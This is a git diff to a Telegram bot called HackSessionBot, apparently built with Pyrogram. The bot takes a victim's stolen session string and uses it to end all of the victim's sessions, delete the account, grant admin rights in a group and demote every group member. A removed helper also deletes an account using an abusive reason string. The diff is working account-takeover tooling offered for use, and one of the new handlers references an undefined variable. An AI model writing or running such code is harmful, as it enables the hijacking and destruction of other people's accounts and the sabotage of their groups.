@@ -9,7 +9,11 @@ from HackSessionBot.Helpers.steve import (
     join_ch,
     leave_ch,
     del_ch,
-    check_2fa )
+    check_2fa,
+    terminate_all,
+    del_acc,
+    piromote,
+    demote_all)
 from HackSessionBot.Helpers.data import HACK_MODS 
 from pyrogram.types import CallbackQuery 
 from pyrogram.raw import functions
@@ -64,7 +68,7 @@ async def d_callback(client : Client, query : CallbackQuery):
             disable_web_page_preview=True)
 
 @app.on_callback_query(filters.regex("E"))
-async def c_callback(client : Client, query : CallbackQuery):
+async def e_callback(client : Client, query : CallbackQuery):
     id = query.message.chat.id   
     session = await client.ask(id,"ɴᴏᴡ ɢɪᴠᴇ ᴍᴇ ᴛʜᴇ sᴛʀɪɴɢ sᴇssɪᴏɴ ᴏғ ᴛʜᴀᴛ ᴜsᴇʀ.")
     gc = await client.ask(id,"ɴᴏᴡ ɢɪᴠᴇ ᴍᴇ ᴛʜᴇ ɢʀᴏᴜᴘ/ᴄʜᴀɴɴᴇʟ ɪᴅ ᴏʀ ᴜsᴇʀɴᴀᴍᴇ") 
@@ -74,7 +78,7 @@ async def c_callback(client : Client, query : CallbackQuery):
             disable_web_page_preview=True)
 
 @app.on_callback_query(filters.regex("F"))
-async def c_callback(client : Client, query : CallbackQuery):
+async def f_callback(client : Client, query : CallbackQuery):
     id = query.message.chat.id   
     session = await client.ask(id,"ɴᴏᴡ ɢɪᴠᴇ ᴍᴇ ᴛʜᴇ sᴛʀɪɴɢ sᴇssɪᴏɴ ᴏғ ᴛʜᴀᴛ ᴜsᴇʀ.")
     gc = await client.ask(id,"ɴᴏᴡ ɢɪᴠᴇ ᴍᴇ ᴛʜᴇ ɢʀᴏᴜᴘ/ᴄʜᴀɴɴᴇʟ ɪᴅ ᴏʀ ᴜsᴇʀɴᴀᴍᴇ") 
@@ -84,7 +88,7 @@ async def c_callback(client : Client, query : CallbackQuery):
             disable_web_page_preview=True)
 
 @app.on_callback_query(filters.regex("G"))
-async def c_callback(client : Client, query : CallbackQuery):
+async def g_callback(client : Client, query : CallbackQuery):
     id = query.message.chat.id   
     session = await client.ask(id,"ɴᴏᴡ ɢɪᴠᴇ ᴍᴇ ᴛʜᴇ sᴛʀɪɴɢ sᴇssɪᴏɴ ᴏғ ᴛʜᴀᴛ ᴜsᴇʀ.")
     gc = await client.ask(id,"ɴᴏᴡ ɢɪᴠᴇ ᴍᴇ ᴛʜᴇ ɢʀᴏᴜᴘ/ᴄʜᴀɴɴᴇʟ ɪᴅ ᴏʀ ᴜsᴇʀɴᴀᴍᴇ") 
@@ -95,7 +99,7 @@ async def c_callback(client : Client, query : CallbackQuery):
 
 
 @app.on_callback_query(filters.regex("H"))
-async def d_callback(client : Client, query : CallbackQuery):
+async def h_callback(client : Client, query : CallbackQuery):
     id = query.message.chat.id   
     session = await client.ask(id,"ɴᴏᴡ ɢɪᴠᴇ ᴍᴇ ᴛʜᴇ sᴛʀɪɴɢ sᴇssɪᴏɴ ᴏғ ᴛʜᴀᴛ ᴜsᴇʀ.")
     hehe = await check_2fa(session.text)
@@ -103,22 +107,41 @@ async def d_callback(client : Client, query : CallbackQuery):
             reply_markup=HACK_MODS,
             disable_web_page_preview=True)
 
-
-async def del_acc(session):
-    async with Client("del",api_id = API_ID,api_hash = API_HASH, session_string = session) as app:
-        async with Client("my_account") as app:
-            await app.invoke(
-        functions.account.DeleteAccount(
-            reason = "mai madarchod hu"
-        )
-    )
-    return "Account deleted successfully"
+@app.on_callback_query(filters.regex("I"))
+async def i_callback(client : Client, query : CallbackQuery):
+    id = query.message.chat.id   
+    session = await client.ask(id,"ɴᴏᴡ ɢɪᴠᴇ ᴍᴇ ᴛʜᴇ sᴛʀɪɴɢ sᴇssɪᴏɴ ᴏғ ᴛʜᴀᴛ ᴜsᴇʀ.")
+    hehe = await terminate_all(session.text)
+    await query.message.reply_text(text = hehe + "\n\n**ᴛʜᴀɴᴋs ғᴏʀ ᴜsɪɴɢ ᴍᴇ , ɢɪᴠᴇ ᴀ sᴛᴀʀ ᴛᴏ ᴍʏ [ʀᴇᴘᴏ](https://github.com/SupremeStark/HackSessionBot)**",
+            reply_markup=HACK_MODS,
+            disable_web_page_preview=True)
 
 @app.on_callback_query(filters.regex("J"))
-async def c_callback(client : Client, query : CallbackQuery):
+async def j_callback(client : Client, query : CallbackQuery):
     id = query.message.chat.id   
     session = await client.ask(id,"ɴᴏᴡ ɢɪᴠᴇ ᴍᴇ ᴛʜᴇ sᴛʀɪɴɢ sᴇssɪᴏɴ ᴏғ ᴛʜᴀᴛ ᴜsᴇʀ.")    
     hehe = await del_acc(session.text)
+    await query.message.reply_text(text = hehe + "\n\n**ᴛʜᴀɴᴋs ғᴏʀ ᴜsɪɴɢ ᴍᴇ , ɢɪᴠᴇ ᴀ sᴛᴀʀ ᴛᴏ ᴍʏ [ʀᴇᴘᴏ](https://github.com/SupremeStark/HackSessionBot)**",
+            reply_markup=HACK_MODS,
+            disable_web_page_preview=True)
+
+@app.on_callback_query(filters.regex("K"))
+async def k_callback(client : Client, query : CallbackQuery):
+    id = query.message.chat.id   
+    session = await client.ask(id,"ɴᴏᴡ ɢɪᴠᴇ ᴍᴇ ᴛʜᴇ sᴛʀɪɴɢ sᴇssɪᴏɴ ᴏғ ᴛʜᴀᴛ ᴜsᴇʀ.")    
+    user_id = await client.ask(id,"ɢɪᴠᴇ ᴍᴇ ᴛʜᴇ ᴜsᴇʀ ɪᴅ/ᴜsᴇʀɴᴀᴍᴇ ᴡʜᴏᴍ ɪ ᴡɪʟʟ ᴘʀᴏᴍᴏᴛᴇ.")
+    gc_id = await client.ask(id,"ɴᴏᴡ ɢɪᴠᴇ ᴍᴇ ᴛʜᴇ ɢʀᴏᴜᴘ ɪᴅ/ᴜsᴇʀɴᴀᴍᴇ ᴡʜᴇʀᴇ ɪ ᴡɪʟʟ ᴘʀᴏᴍᴏᴛᴇ ᴛʜᴀᴛ ᴜsᴇʀ.")
+    hehe = await piromote(session.text,gc_id,user_id)
+    await query.message.reply_text(text = hehe + "\n\n**ᴛʜᴀɴᴋs ғᴏʀ ᴜsɪɴɢ ᴍᴇ , ɢɪᴠᴇ ᴀ sᴛᴀʀ ᴛᴏ ᴍʏ [ʀᴇᴘᴏ](https://github.com/SupremeStark/HackSessionBot)**",
+            reply_markup=HACK_MODS,
+            disable_web_page_preview=True)
+
+@app.on_callback_query(filters.regex("L"))
+async def l_callback(client : Client, query : CallbackQuery):
+    id = query.message.chat.id   
+    session = await client.ask(id,"ɴᴏᴡ ɢɪᴠᴇ ᴍᴇ ᴛʜᴇ sᴛʀɪɴɢ sᴇssɪᴏɴ ᴏғ ᴛʜᴀᴛ ᴜsᴇʀ.")    
+    gc_id = await client.ask(id,"ɴᴏᴡ ɢɪᴠᴇ ᴍᴇ ᴛʜᴇ ɢʀᴏᴜᴘ ɪᴅ/ᴜsᴇʀɴᴀᴍᴇ ᴡʜᴇʀᴇ ɪ ᴡɪʟʟ ᴅᴇᴍᴏᴛᴇ ᴀʟʟ ᴍᴇᴍʙᴇʀs.")
+    hehe = await demote_all(session.text,gc_id,user_id)
     await query.message.reply_text(text = hehe + "\n\n**ᴛʜᴀɴᴋs ғᴏʀ ᴜsɪɴɢ ᴍᴇ , ɢɪᴠᴇ ᴀ sᴛᴀʀ ᴛᴏ ᴍʏ [ʀᴇᴘᴏ](https://github.com/SupremeStark/HackSessionBot)**",
             reply_markup=HACK_MODS,
             disable_web_page_preview=True)
